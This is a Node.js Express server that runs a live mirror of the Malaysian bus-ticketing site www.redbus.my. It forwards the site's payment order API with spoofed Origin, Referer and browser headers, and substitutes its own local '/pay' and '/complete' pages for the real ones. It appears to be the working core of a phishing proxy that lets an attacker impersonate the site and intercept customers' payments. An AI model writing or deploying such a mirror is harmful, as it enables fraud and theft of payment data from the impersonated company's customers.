import 'dotenv/config';
import express from 'express';
import http from 'http';
import https from 'https';
import { createRedbusProxy } from './proxy.js';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));

process.on('uncaughtException', (err) => { console.error('[FATAL]', err.message); });
process.on('unhandledRejection', (reason) => { console.error('[REJECT]', reason); });

const PORT = parseInt(process.env.PORT || '3000');
const TARGET_HOST = 'www.redbus.my';
const app = express();

// Handle POST body forwarding for orderInfo API (manual proxy)
app.use((req, res, next) => {
  if (req.method === 'POST' && req.url.startsWith('/redPay/api/orderInfo')) {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
    const body = Buffer.concat(chunks);
    const proxyReq = https.request({
      hostname: TARGET_HOST,
      path: req.url,
      method: 'POST',
      headers: {
        'Content-Type': req.headers['content-type'] || 'application/json',
        'Content-Length': String(body.length),
        'Host': TARGET_HOST,
        'Origin': 'https://' + TARGET_HOST,
        'Referer': 'https://' + TARGET_HOST + '/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    }, proxyRes => {
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(res);
    });
    proxyReq.on('error', err => { console.error('[orderInfo]', err.message); if (!res.headersSent) res.status(502).send('Bad gateway'); });
    proxyReq.write(body);
    proxyReq.end();
  });
    return;
  }
  next();
});

const mainProxy = createRedbusProxy(process.env.PUBLIC_HOST || `localhost:${PORT}`);

app.use('/pay', express.static(join(__dirname, '..', 'public', 'pay')));
app.use('/complete', express.static(join(__dirname, '..', 'public', 'complete')));
app.use('/', ...mainProxy);

const server = http.createServer(app);
server.timeout = 120000;
server.keepAliveTimeout = 65000;

server.listen(PORT, '0.0.0.0', () => console.log(`[Redbus Mirror] Port ${PORT}`));
